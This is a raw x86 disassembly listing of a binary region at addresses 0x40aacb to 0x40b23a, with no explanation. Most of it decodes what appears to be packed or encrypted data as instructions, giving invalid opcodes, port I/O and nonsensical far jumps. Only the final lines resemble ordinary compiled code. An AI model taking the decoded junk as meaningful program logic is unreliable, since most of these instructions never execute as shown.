  40aacb:	xchg   edx,eax
  40aacc:	inc    ebx
  40aacd:	pusha  
  40aace:	ffree  st(4)
  40aad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aad1:	mov    al,ds:0x7b9513c2
  40aad6:	les    esp,FWORD PTR [eax]
  40aad8:	mov    dh,0x2d
  40aada:	clc    
  40aadb:	adc    BYTE PTR [edi+0x276d798a],al
  40aae1:	cmp    DWORD PTR [edi-0x698e39f4],esp
  40aae7:	pop    ecx
  40aae8:	sub    ebx,DWORD PTR [ebx-0x25edcd88]
  40aaee:	dec    edi
  40aaef:	lds    ebp,FWORD PTR [ebx-0x77]
  40aaf2:	ficom  WORD PTR [eax]
  40aaf4:	cmp    eax,0x91e74851
  40aaf9:	das    
  40aafa:	sub    cl,BYTE PTR [eax+0x44]
  40aafd:	dec    esp
  40aafe:	inc    bp
  40ab00:	dec    edi
  40ab01:	fimul  DWORD PTR [ebp+0x7a76fec7]
  40ab07:	out    0xbb,al
  40ab09:	and    ebp,DWORD PTR [ebx+0x552f26e6]
  40ab0f:	pop    ecx
  40ab10:	inc    esp
  40ab11:	push   ds
  40ab12:	inc    ecx
  40ab13:	outs   dx,DWORD PTR ds:[esi]
  40ab14:	jmp    0xce43:0xd3352bc7
  40ab1b:	loop   0x40ab0b
  40ab1d:	pop    edx
  40ab1e:	fmul   QWORD PTR [esi+0x195f251a]
  40ab24:	pusha  
  40ab25:	aam    0x87
  40ab27:	hlt    
  40ab28:	push   cs
  40ab29:	mov    ch,0x69
  40ab2b:	push   edx
  40ab2c:	into   
  40ab2d:	ins    DWORD PTR es:[edi],dx
  40ab2e:	sub    eax,0xc5392896
  40ab33:	push   edi
  40ab34:	rol    BYTE PTR [eax+eiz*2],1
  40ab37:	xchg   ebp,eax
  40ab38:	(bad)  
  40ab3a:	adc    BYTE PTR [eax],bl
  40ab3c:	pop    edi
  40ab3d:	xor    BYTE PTR [eax-0x5d546a57],0x3e
  40ab44:	and    eax,0x25c41bf2
  40ab49:	inc    ecx
  40ab4a:	sub    al,0x5a
  40ab4c:	mov    edx,0x5774f26e
  40ab51:	into   
  40ab52:	lahf   
  40ab53:	nop
  40ab54:	retf   
  40ab55:	xor    DWORD PTR [ecx+0x52bb5fb3],ebx
  40ab5b:	je     0x40abb5
  40ab5d:	push   cs
  40ab5e:	xchg   BYTE PTR [ebx-0x25a1bec0],ch
  40ab64:	ins    BYTE PTR es:[edi],dx
  40ab65:	(bad)  
  40ab67:	mov    dl,BYTE PTR [ebp-0x12]
  40ab6a:	sbb    edi,DWORD PTR [edi-0x1bee269a]
  40ab70:	xchg   ebp,eax
  40ab71:	sub    BYTE PTR [edi],dh
  40ab73:	pop    ebx
  40ab74:	out    dx,eax
  40ab75:	enter  0xbb9,0xb5
  40ab79:	push   eax
  40ab7a:	mov    WORD PTR [ecx+0x23],gs
  40ab7d:	out    dx,al
  40ab7e:	sbb    esi,DWORD PTR [ebx+eax*2]
  40ab81:	jp     0x40ab6c
  40ab83:	and    edi,DWORD PTR [ecx+0x2335c014]
  40ab89:	xlat   BYTE PTR ds:[ebx]
  40ab8a:	and    ah,ch
  40ab8c:	daa    
  40ab8d:	push   esp
  40ab8e:	add    dh,BYTE PTR [eax-0x69]
  40ab91:	js     0x40ac04
  40ab93:	mov    cl,0x98
  40ab95:	into   
  40ab96:	jnp    0x40ab46
  40ab98:	retf   0x6881
  40ab9b:	push   es
  40ab9c:	xor    esp,DWORD PTR [ecx+eiz*4-0x68]
  40aba0:	sbb    al,dl
  40aba2:	and    al,0xf7
  40aba4:	push   0x45
  40aba6:	pop    edx
  40aba7:	rcl    BYTE PTR [ecx+0x15],cl
  40abaa:	inc    edx
  40abab:	xrelease mov BYTE PTR [ecx-0x7],0x78
  40abb0:	mov    esi,0x156eb9e7
  40abb5:	jge    0x40ab3a
  40abb7:	jecxz  0x40ac25
  40abb9:	sbb    al,0xa3
  40abbb:	lds    esp,FWORD PTR ds:0x341b5d34
  40abc1:	std    
  40abc2:	push   eax
  40abc3:	cli    
  40abc4:	es jmp 0x11ac38ef
  40abca:	je     0x40ac02
  40abcc:	in     al,0x92
  40abce:	sbb    DWORD PTR [ebx-0x70],edx
  40abd1:	xchg   esp,eax
  40abd2:	cdq    
  40abd3:	jmp    0x40ac4e
  40abd5:	add    al,0xe7
  40abd7:	inc    eax
  40abd8:	sub    BYTE PTR [ecx],dl
  40abda:	push   eax
  40abdb:	arpl   WORD PTR [ecx],bp
  40abdd:	test   BYTE PTR [edx-0x54],bh
  40abe0:	aad    0x5a
  40abe2:	inc    ebp
  40abe3:	xor    al,0xc7
  40abe5:	lahf   
  40abe6:	sub    bh,BYTE PTR [ecx-0x6617353]
  40abec:	loopne 0x40aba2
  40abee:	loop   0x40abb3
  40abf0:	mov    dl,0x64
  40abf2:	into   
  40abf3:	cmp    BYTE PTR ds:0xf9886677,al
  40abf9:	sbb    BYTE PTR [eax-0x74],dl
  40abfc:	fwait
  40abfd:	xchg   ebp,eax
  40abfe:	xchg   edx,eax
  40abff:	ss mov bl,0x78
  40ac02:	sar    ah,1
  40ac04:	pop    ss
  40ac05:	fisttp WORD PTR [esi-0x4]
  40ac08:	sbb    al,0xd1
  40ac0a:	push   ss
  40ac0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac0c:	dec    ebx
  40ac0d:	mov    esi,DWORD PTR [edi+esi*2-0x67b514b]
  40ac14:	stos   DWORD PTR es:[edi],eax
  40ac15:	in     al,dx
  40ac16:	mov    ecx,0x732bd413
  40ac1b:	dec    esi
  40ac1c:	out    dx,al
  40ac1d:	das    
  40ac1e:	jle    0x40ac12
  40ac20:	dec    ebx
  40ac21:	inc    eax
  40ac22:	fld    DWORD PTR [edx*2+0x72e9ee82]
  40ac29:	scas   al,BYTE PTR es:[edi]
  40ac2a:	rcr    BYTE PTR [eax+ebx*8+0x56],0x3c
  40ac2f:	mov    eax,0x197af51e
  40ac34:	mov    edx,0xfa3fc388
  40ac39:	jl     0x40acaf
  40ac3b:	fild   WORD PTR [edi+0x6e]
  40ac3e:	pop    eax
  40ac3f:	fnstenv [ebx+ecx*2]
  40ac42:	cli    
  40ac43:	sbb    ch,BYTE PTR [esi+ebx*1+0xb]
  40ac47:	xor    ebx,DWORD PTR [ebx+eax*8-0x681f61bd]
  40ac4e:	lea    edi,[ebx-0x4b]
  40ac51:	clc    
  40ac52:	push   ds
  40ac53:	fbstp  TBYTE PTR [esi+0x3e]
  40ac56:	push   ebp
  40ac57:	mov    ebp,0xe49c3979
  40ac5c:	push   0xfffffff2
  40ac5e:	sbb    DWORD PTR [ecx],esi
  40ac60:	inc    edx
  40ac61:	aaa    
  40ac62:	cli    
  40ac63:	arpl   WORD PTR [eax-0x31],dx
  40ac66:	mov    edi,0xa8168e0f
  40ac6b:	dec    edx
  40ac6c:	push   esi
  40ac6d:	xchg   dh,al
  40ac6f:	repnz pusha 
  40ac71:	adc    eax,0xde4e7693
  40ac76:	adc    ebp,DWORD PTR es:[ecx]
  40ac79:	nop
  40ac7a:	jbe    0x40ac56
  40ac7c:	in     eax,dx
  40ac7d:	pop    ss
  40ac7e:	mov    ebp,0x8239c8e1
  40ac83:	fwait
  40ac84:	mov    ds:0x9c4489c3,eax
  40ac89:	out    0x84,eax
  40ac8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac8c:	mov    cl,0x9a
  40ac8e:	push   es
  40ac8f:	inc    esp
  40ac90:	dec    eax
  40ac92:	es jns 0x40ac9d
  40ac95:	out    0xc6,al
  40ac97:	jl     0x40ac4c
  40ac99:	or     dl,BYTE PTR [eax]
  40ac9b:	xchg   ebx,eax
  40ac9c:	in     eax,0xce
  40ac9e:	sbb    al,0xf9
  40aca0:	out    0x64,al
  40aca2:	scas   eax,DWORD PTR es:[edi]
  40aca3:	adc    BYTE PTR [ebx-0x19ea8ec],ah
  40aca9:	sub    BYTE PTR [edi],dl
  40acab:	cwde   
  40acac:	mov    ds:0x4dd74a21,al
  40acb1:	call   0x2a64679a
  40acb6:	arpl   WORD PTR [eax],si
  40acb8:	or     ah,BYTE PTR [eax]
  40acba:	enter  0x673d,0xb9
  40acbe:	ss xchg ebx,eax
  40acc0:	ret    
  40acc1:	adc    BYTE PTR [edi],dh
  40acc3:	scas   al,BYTE PTR es:[edi]
  40acc4:	leave  
  40acc5:	xchg   ebp,eax
  40acc6:	push   ebp
  40acc7:	cld    
  40acc8:	mov    ebx,0x8863c429
  40accd:	fist   WORD PTR [edx]
  40accf:	sub    al,0x9f
  40acd1:	dec    edi
  40acd2:	loope  0x40ad00
  40acd4:	mov    ds:0xe70b2f8b,al
  40acd9:	xor    BYTE PTR [eax+0x18e5239c],0xc1
  40ace0:	push   edi
  40ace1:	shr    BYTE PTR [ebx],1
  40ace3:	jae    0x40acae
  40ace5:	daa    
  40ace6:	adc    al,0x87
  40ace8:	add    BYTE PTR [eax],0x58
  40aceb:	sbb    bl,BYTE PTR [ebx+0x5a]
  40acee:	sahf   
  40acef:	clc    
  40acf0:	sar    DWORD PTR ds:0x249266e9,0xe5
  40acf7:	pop    es
  40acf8:	mov    esp,0xde264768
  40acfd:	iret   
  40acfe:	pop    esp
  40acff:	mov    dl,0xda
  40ad01:	adc    BYTE PTR [esi-0x3f],dh
  40ad04:	push   ecx
  40ad05:	mov    dl,0x7f
  40ad07:	out    0x2,eax
  40ad09:	sub    DWORD PTR [esi+0x6a],0xee9cbc51
  40ad10:	sbb    ah,BYTE PTR [ecx]
  40ad12:	push   ebx
  40ad13:	jmp    0xf6e23c90
  40ad18:	rcr    ebx,1
  40ad1a:	xchg   ebx,eax
  40ad1b:	mov    ch,0xff
  40ad1d:	fcom   DWORD PTR [eax-0x80]
  40ad20:	es push edi
  40ad22:	xor    eax,0x52e94863
  40ad27:	test   eax,0x38e204ee
  40ad2c:	inc    edx
  40ad2d:	cmp    DWORD PTR [esi-0x49],esp
  40ad30:	in     al,dx
  40ad31:	outs   dx,DWORD PTR ds:[esi]
  40ad32:	adc    ecx,DWORD PTR [ebp+ebx*2+0x1994f294]
  40ad39:	inc    esi
  40ad3a:	repz sub BYTE PTR [ebp+eax*2-0x4d522e5],bl
  40ad42:	leave  
  40ad43:	and    eax,0x62230681
  40ad48:	repnz adc bh,0x3e
  40ad4c:	icebp  
  40ad4d:	adc    BYTE PTR [edx],dl
  40ad4f:	aas    
  40ad50:	push   ss
  40ad51:	(bad)  
  40ad52:	adc    DWORD PTR [ecx-0x2f4d3b79],ebx
  40ad58:	add    BYTE PTR ss:[edx+0x6c],ch
  40ad5c:	add    BYTE PTR [ebp-0x75],bh
  40ad5f:	mov    al,ds:0x474da454
  40ad64:	mov    ds:0x7326d4f,eax
  40ad69:	lock sbb BYTE PTR [edx-0x27],bl
  40ad6d:	lock lds edx,FWORD PTR [eax+0x44]
  40ad71:	sbb    al,0x54
  40ad73:	cdq    
  40ad74:	add    BYTE PTR [ebp-0x5b],0xfa
  40ad78:	and    ch,BYTE PTR ds:[edx-0x6435ef33]
  40ad7f:	mov    WORD PTR [esi+0x447ab4dd],?
  40ad85:	mov    dh,0xb9
  40ad87:	in     eax,0xbd
  40ad89:	mov    WORD PTR [edi],fs
  40ad8b:	jo     0x40adbe
  40ad8d:	push   edi
  40ad8e:	add    al,cl
  40ad90:	jb     0x40ad7c
  40ad92:	test   al,0x33
  40ad94:	aas    
  40ad95:	adc    eax,0x67e97b10
  40ad9a:	pusha  
  40ad9b:	and    dh,BYTE PTR [eax+0x1abd3a]
  40ada1:	popf   
  40ada2:	(bad)  
  40ada3:	push   esp
  40ada4:	cmp    al,0x96
  40ada6:	lock cmp ecx,DWORD PTR [edi]
  40ada9:	shl    BYTE PTR [edx+0x62],cl
  40adac:	jnp    0x40ade6
  40adae:	or     BYTE PTR [eax+0x10],dh
  40adb1:	adc    eax,0x9e8284cf
  40adb6:	repnz cmp BYTE PTR [ecx+0x3a],dh
  40adba:	cli    
  40adbb:	mov    dh,ah
  40adbd:	xor    BYTE PTR [ebx-0x3b],ch
  40adc0:	sbb    BYTE PTR ds:0x268729af,0xe9
  40adc7:	mov    ebp,DWORD PTR [edx]
  40adc9:	bound  esp,QWORD PTR [edx+eiz*1+0x53]
  40adcd:	pop    edx
  40adce:	in     al,0x36
  40add0:	jmp    0x8dd85e2c
  40add5:	or     al,0x66
  40add7:	gs push es
  40add9:	stos   DWORD PTR es:[edi],eax
  40adda:	pusha  
  40addb:	adc    DWORD PTR [ebx-0x3e61a3f3],edi
  40ade1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade2:	js     0x40ae0c
  40ade4:	jg     0x40adaa
  40ade6:	cmp    ebp,ebx
  40ade8:	pop    es
  40ade9:	arpl   WORD PTR [ecx-0x7ba2f9a7],cx
  40adef:	mov    cl,BYTE PTR [esi-0x3b]
  40adf2:	add    dh,al
  40adf4:	xor    al,0xa1
  40adf6:	push   ecx
  40adf7:	jno    0x40adbd
  40adf9:	fld    QWORD PTR [eax+0x46001481]
  40adff:	addr16 mov ebx,0xb82d187e
  40ae05:	stos   DWORD PTR es:[edi],eax
  40ae06:	fist   DWORD PTR [edi]
  40ae08:	mov    dl,0xae
  40ae0a:	rol    edx,1
  40ae0c:	mov    cl,0x57
  40ae0e:	fisttp QWORD PTR [ebx+ecx*2-0x62e87e91]
  40ae15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae16:	cdq    
  40ae17:	imul   ebx,edx,0xea554096
  40ae1d:	mov    cl,0xc5
  40ae1f:	leave  
  40ae20:	fdiv   st,st(7)
  40ae22:	in     eax,dx
  40ae23:	pop    esp
  40ae24:	and    al,0x8d
  40ae26:	cmp    DWORD PTR [edi],edx
  40ae28:	add    al,BYTE PTR [edx+0x15]
  40ae2b:	retf   
  40ae2c:	arpl   dx,bp
  40ae2e:	sub    esp,DWORD PTR [esi]
  40ae30:	mov    ebp,ebp
  40ae32:	in     al,0xeb
  40ae34:	mov    DWORD PTR [esp+ebx*1+0x5c4f8bab],eax
  40ae3b:	cmp    cl,BYTE PTR [eax]
  40ae3d:	dec    ebp
  40ae3e:	add    bh,0xcf
  40ae41:	pushf  
  40ae42:	repnz ins DWORD PTR es:[edi],dx
  40ae44:	push   edi
  40ae45:	mov    ch,0xbd
  40ae47:	inc    ebx
  40ae48:	jp     0x40ae7d
  40ae4a:	gs jl  0x40ae87
  40ae4d:	dec    edx
  40ae4e:	(bad)  
  40ae4f:	loopne 0x40ae53
  40ae51:	test   dl,ah
  40ae53:	lods   al,BYTE PTR ds:[esi]
  40ae54:	les    esp,FWORD PTR [edi-0x6b]
  40ae57:	or     ebp,DWORD PTR [eax]
  40ae59:	fsubr  DWORD PTR [ebp+0x545c881d]
  40ae5f:	jne    0x40ae0e
  40ae61:	pop    esp
  40ae62:	dec    ecx
  40ae63:	mov    ch,0x27
  40ae65:	jb     0x40adfc
  40ae67:	shl    edx,cl
  40ae69:	cmc    
  40ae6a:	cmp    dh,BYTE PTR ds:[eax-0x33]
  40ae6e:	dec    ebx
  40ae6f:	jbe    0x40ae37
  40ae71:	aad    0x9a
  40ae73:	jp     0x40aee0
  40ae75:	or     ebp,ebx
  40ae77:	mov    esi,DWORD PTR [esi-0x21]
  40ae7a:	and    bl,ah
  40ae7c:	mov    DWORD PTR [ecx],0xd9c8e40b
  40ae82:	(bad)  
  40ae83:	xchg   ecx,eax
  40ae84:	les    eax,FWORD PTR [edx]
  40ae86:	sub    BYTE PTR [esi],bl
  40ae88:	pop    eax
  40ae89:	out    0xfe,al
  40ae8b:	mov    ecx,DWORD PTR [edi]
  40ae8d:	in     eax,0xc8
  40ae8f:	in     eax,dx
  40ae90:	and    ch,bl
  40ae92:	sahf   
  40ae93:	ret    
  40ae94:	xchg   edx,eax
  40ae95:	pop    esp
  40ae96:	lds    edi,FWORD PTR [ecx-0xc0f5150]
  40ae9c:	jl     0x40aee3
  40ae9e:	loopne 0x40ae28
  40aea0:	and    bh,BYTE PTR [ecx-0x72]
  40aea3:	adc    esi,edi
  40aea5:	daa    
  40aea6:	scas   eax,DWORD PTR es:[edi]
  40aea7:	mov    ss,WORD PTR [esi]
  40aea9:	outs   dx,DWORD PTR ds:[esi]
  40aeaa:	fs inc ebp
  40aeac:	push   es
  40aead:	shl    DWORD PTR [eax],0x5c
  40aeb0:	(bad)  [ebp+eiz*1+0x1391aaf0]
  40aeb7:	xchg   esi,eax
  40aeb8:	xadd   dh,ah
  40aebb:	imul   DWORD PTR [ebx]
  40aebd:	inc    edx
  40aebe:	pop    es
  40aebf:	pop    ebx
  40aec0:	aam    0x53
  40aec2:	sub    DWORD PTR [esi],edx
  40aec4:	dec    ebp
  40aec5:	(bad)  
  40aec6:	jge    0x40aef8
  40aec8:	and    al,0x8
  40aeca:	or     eax,0x9a3f0e4f
  40aecf:	mov    al,0x7c
  40aed1:	fiadd  WORD PTR [edx-0x25631eb2]
  40aed7:	inc    ecx
  40aed8:	pop    eax
  40aed9:	popf   
  40aeda:	pop    es
  40aedb:	fistp  WORD PTR [ebx+0x2d3ea331]
  40aee1:	cli    
  40aee2:	xchg   ecx,eax
  40aee3:	jns    0x40ae6e
  40aee5:	test   DWORD PTR [ebx-0x45],ebp
  40aee8:	adc    ebp,DWORD PTR [ecx]
  40aeea:	jp     0x40ae70
  40aeec:	inc    ebp
  40aeed:	stc    
  40aeee:	imul   esi,DWORD PTR [eax-0x35f3a71],0x5f9a57d0
  40aef8:	sub    DWORD PTR [ebp+0x7a],edx
  40aefb:	fwait
  40aefc:	adc    BYTE PTR [ecx],ch
  40aefe:	push   ss
  40aeff:	xor    al,0xa5
  40af01:	shr    DWORD PTR [esi+0x16],1
  40af04:	lahf   
  40af05:	inc    ebp
  40af06:	jmp    0x42942a82
  40af0b:	ret    
  40af0c:	ror    BYTE PTR [ebp+0x5c90b364],cl
  40af12:	out    dx,al
  40af13:	adc    ch,ah
  40af15:	sub    al,0x3f
  40af17:	fst    DWORD PTR [eax+0x44]
  40af1a:	dec    esp
  40af1b:	leave  
  40af1c:	repnz and esi,DWORD PTR [esi-0x36ff8f6b]
  40af23:	outs   dx,DWORD PTR ds:[esi]
  40af24:	ret    0xf2dc
  40af27:	in     al,dx
  40af28:	stc    
  40af29:	test   BYTE PTR [edi-0x639bbae],cl
  40af2f:	dec    eax
  40af30:	inc    edi
  40af31:	ds cwde 
  40af33:	(bad)  
  40af34:	cmp    BYTE PTR [ebx-0x68],bl
  40af37:	sar    BYTE PTR [ebp-0x7f],0x3a
  40af3b:	xchg   edi,eax
  40af3c:	rcl    ah,0x25
  40af3f:	cmp    al,0xa3
  40af41:	xchg   BYTE PTR [esi+ecx*2-0x19],ch
  40af45:	stos   BYTE PTR es:[edi],al
  40af46:	daa    
  40af47:	mov    ebp,0x1d7090cc
  40af4c:	sbb    ecx,DWORD PTR ds:0xcb33bd75
  40af52:	loopne 0x40af53
  40af54:	dec    ecx
  40af55:	in     eax,0x77
  40af57:	sbb    DWORD PTR [edx+0x4be860b4],eax
  40af5d:	inc    esi
  40af5e:	or     al,0x27
  40af60:	push   0xffffffc5
  40af62:	push   ecx
  40af63:	push   edx
  40af64:	sete   BYTE PTR [esi+eiz*2-0x21334622]
  40af6c:	sbb    BYTE PTR ds:0x9689b1c7,bl
  40af72:	ins    DWORD PTR es:[edi],dx
  40af73:	dec    edx
  40af74:	dec    edx
  40af75:	cmp    bl,BYTE PTR ds:0xc3f0a79d
  40af7b:	aaa    
  40af7c:	sbb    BYTE PTR [ebx-0x72],dl
  40af7f:	into   
  40af80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af81:	int    0x3c
  40af83:	or     edx,ebx
  40af85:	pop    ebp
  40af86:	popf   
  40af87:	cmp    eax,0xa83aa299
  40af8c:	pop    ds
  40af8d:	jo     0x40afa3
  40af8f:	cwde   
  40af90:	rol    DWORD PTR [edi+0x26],1
  40af93:	jmp    0x7dc1a3ea
  40af98:	pop    ecx
  40af99:	test   al,0x17
  40af9b:	mul    cl
  40af9d:	push   cs
  40af9e:	aaa    
  40af9f:	sub    eax,0x165f9a82
  40afa4:	jns    0x40affa
  40afa6:	xor    ebx,DWORD PTR [eax-0x76752fca]
  40afac:	aam    0x81
  40afae:	test   eax,0x26913af1
  40afb3:	mov    dl,0xbf
  40afb5:	dec    esp
  40afb6:	push   0x138f3d0e
  40afbb:	in     eax,dx
  40afbc:	(bad)  
  40afbd:	fild   DWORD PTR [ecx-0x15]
  40afc0:	div    al
  40afc2:	call   0xea77:0xc6483afd
  40afc9:	xchg   edi,eax
  40afca:	push   edi
  40afcb:	not    eax
  40afcd:	cmp    eax,0x3cc7bd21
  40afd2:	sbb    eax,0xb21518c3
  40afd7:	jo     0x40b03a
  40afd9:	ficomp DWORD PTR [ebp-0x3]
  40afdc:	jmp    0x2834:0x36f3de62
  40afe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afe4:	ss into 
  40afe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afe7:	lock cmp esp,DWORD PTR [ecx+0x5c947c73]
  40afee:	pop    eax
  40afef:	add    eax,0xd3c70947
  40aff4:	adc    cl,al
  40aff6:	push   0xffffffa8
  40aff8:	mov    al,0xd2
  40affa:	adc    eax,0x4cb206ea
  40afff:	mov    BYTE PTR [edx+ebx*1-0x561c6a7a],ch
  40b006:	int    0x75
  40b008:	push   esp
  40b009:	ja     0x40b074
  40b00b:	xchg   ebp,eax
  40b00c:	and    DWORD PTR [esi],ebx
  40b00e:	xor    dl,dh
  40b010:	in     eax,dx
  40b011:	jg     0x40afc0
  40b013:	and    cl,dl
  40b015:	push   ebx
  40b016:	push   ds
  40b017:	mov    ecx,ecx
  40b019:	ret    0xa14b
  40b01c:	(bad)  
  40b01d:	shr    BYTE PTR ds:0x2641a3a,0x5f
  40b024:	xor    DWORD PTR [edx+0x42],esp
  40b027:	stos   DWORD PTR es:[edi],eax
  40b028:	pop    esi
  40b029:	sbb    al,0x8d
  40b02b:	jo     0x40b015
  40b02d:	pop    esi
  40b02e:	push   eax
  40b02f:	mov    dl,BYTE PTR [ecx+0x60408b83]
  40b035:	sahf   
  40b036:	pop    esi
  40b037:	scas   al,BYTE PTR es:[edi]
  40b038:	mov    cs,ebx
  40b03a:	and    DWORD PTR [ebp+0x876aaab],ebx
  40b040:	retf   0x2a73
  40b043:	popf   
  40b044:	js     0x40afeb
  40b046:	pop    edi
  40b047:	cmp    eax,0x21a96d62
  40b04c:	out    0x48,eax
  40b04e:	pop    esi
  40b04f:	or     BYTE PTR [edi+0x9991277],al
  40b055:	mov    ecx,0x8a4053a8
  40b05a:	sti    
  40b05b:	or     eax,0xa6cdece
  40b060:	push   ds
  40b061:	adc    BYTE PTR [edx-0x11270d48],bl
  40b067:	xor    al,0xf0
  40b069:	pop    ebp
  40b06a:	cld    
  40b06b:	jbe    0x40b0b4
  40b06d:	dec    edx
  40b06e:	mov    ds:0xa2b7af80,eax
  40b073:	loopne 0x40b07c
  40b075:	pop    eax
  40b076:	jge    0x40b02d
  40b078:	xchg   cl,ah
  40b07a:	in     al,dx
  40b07b:	mov    edi,0x44bf1964
  40b080:	outs   dx,DWORD PTR ds:[esi]
  40b081:	in     eax,dx
  40b082:	or     dl,0x67
  40b085:	in     al,dx
  40b086:	sti    
  40b087:	fadd   DWORD PTR [edx+edx*2]
  40b08a:	xchg   BYTE PTR [edx],cl
  40b08c:	mov    DWORD PTR [eax],ebx
  40b08e:	adc    al,0x15
  40b090:	jno    0x40b061
  40b092:	pop    ebp
  40b093:	jbe    0x40b05d
  40b095:	xchg   edi,eax
  40b096:	mov    cl,0xe7
  40b098:	jae    0x40b04f
  40b09a:	test   DWORD PTR [edx+0x19d208dc],eax
  40b0a0:	iret   
  40b0a1:	pop    edx
  40b0a2:	pop    es
  40b0a3:	mov    edi,0xc4022b72
  40b0a8:	xchg   ecx,eax
  40b0a9:	dec    ecx
  40b0aa:	leave  
  40b0ab:	aaa    
  40b0ac:	xchg   edx,eax
  40b0ad:	rcl    BYTE PTR [esi-0x7312cb0c],0x28
  40b0b4:	dec    ebx
  40b0b5:	add    ah,BYTE PTR [edi+ebp*4-0x3e30f599]
  40b0bc:	xchg   edi,eax
  40b0bd:	pop    eax
  40b0be:	mov    eax,0xa4b6e25f
  40b0c3:	ret    0xd3b3
  40b0c6:	jmp    0x618d:0x3a870100
  40b0cd:	(bad)  
  40b0ce:	fidiv  DWORD PTR [edi-0x66]
  40b0d1:	xchg   BYTE PTR [esi-0x24],bh
  40b0d4:	cmp    DWORD PTR [ecx+ebp*8-0x20],edi
  40b0d8:	dec    ebp
  40b0d9:	xor    al,0xc2
  40b0db:	add    esp,DWORD PTR [ebp+0x7a]
  40b0de:	mov    ecx,0x386ec8c1
  40b0e3:	jmp    0x64b5:0x6085cbc0
  40b0ea:	aad    0xa8
  40b0ec:	jecxz  0x40b0d0
  40b0ee:	pop    es
  40b0ef:	lock gs in al,dx
  40b0f2:	xor    BYTE PTR [esi+0x70185c72],bh
  40b0f8:	jl     0x40b0c5
  40b0fa:	in     eax,dx
  40b0fb:	jno    0x40b11f
  40b0fd:	and    al,0x20
  40b0ff:	lods   eax,DWORD PTR ds:[esi]
  40b100:	and    BYTE PTR [edx-0x4f],cl
  40b103:	aas    
  40b104:	sub    BYTE PTR [ecx-0x1a],ah
  40b107:	and    al,0x4a
  40b109:	int3   
  40b10a:	pop    ss
  40b10b:	mov    esi,0xb2bb5b7e
  40b110:	ja     0x40b0fa
  40b112:	nop
  40b113:	aas    
  40b114:	inc    esi
  40b115:	pop    ecx
  40b116:	jmp    0xbfa2:0xf3355b9b
  40b11d:	inc    ebp
  40b11e:	jmp    FWORD PTR [ebp-0x5f33e222]
  40b124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b125:	cmp    al,0x67
  40b127:	dec    ecx
  40b128:	out    dx,al
  40b129:	pop    edx
  40b12a:	popa   
  40b12b:	ins    BYTE PTR es:[edi],dx
  40b12c:	repz mov bl,0x35
  40b12f:	js     0x40b159
  40b131:	das    
  40b132:	or     DWORD PTR [edx+0x42],0xe95370d9
  40b139:	mov    BYTE PTR [ecx+0x663fd596],dh
  40b13f:	cmc    
  40b140:	pop    ebx
  40b141:	lods   eax,DWORD PTR ds:[esi]
  40b142:	jmp    0x81100d32
  40b147:	aad    0x4a
  40b149:	scas   al,BYTE PTR es:[edi]
  40b14a:	outs   dx,BYTE PTR ds:[esi]
  40b14b:	add    dh,0x9c
  40b14e:	xlat   BYTE PTR ds:[ebx]
  40b14f:	cmp    bh,BYTE PTR [eax-0x4f2066ce]
  40b155:	or     ch,BYTE PTR [ecx-0x3c]
  40b158:	mov    esp,0x4b37faee
  40b15d:	xchg   ecx,eax
  40b15e:	adc    DWORD PTR [edi],ebx
  40b160:	push   eax
  40b161:	or     ch,BYTE PTR [edx]
  40b163:	and    al,cl
  40b165:	test   eax,0x8df95e56
  40b16a:	dec    esi
  40b16b:	pop    edi
  40b16c:	pop    edi
  40b16d:	dec    eax
  40b16e:	dec    eax
  40b16f:	mov    cl,0x70
  40b171:	dec    ecx
  40b172:	outs   dx,BYTE PTR ds:[esi]
  40b173:	jle    0x40b1e9
  40b175:	mov    ah,0xc5
  40b177:	and    cl,al
  40b179:	adc    bl,ah
  40b17b:	in     al,0x1b
  40b17d:	ss push es
  40b17f:	dec    ebx
  40b180:	dec    ebx
  40b181:	jbe    0x40b1b8
  40b183:	mov    al,0x93
  40b185:	xor    BYTE PTR [eax+ebp*2-0x4d],0xb9
  40b18a:	lods   al,BYTE PTR ds:[esi]
  40b18b:	in     al,0x7b
  40b18d:	mov    edx,0x8bf324b4
  40b192:	test   DWORD PTR [esi],edx
  40b194:	test   bh,0x34
  40b197:	mov    eax,DWORD PTR [ebp+0x18]
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3dc
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
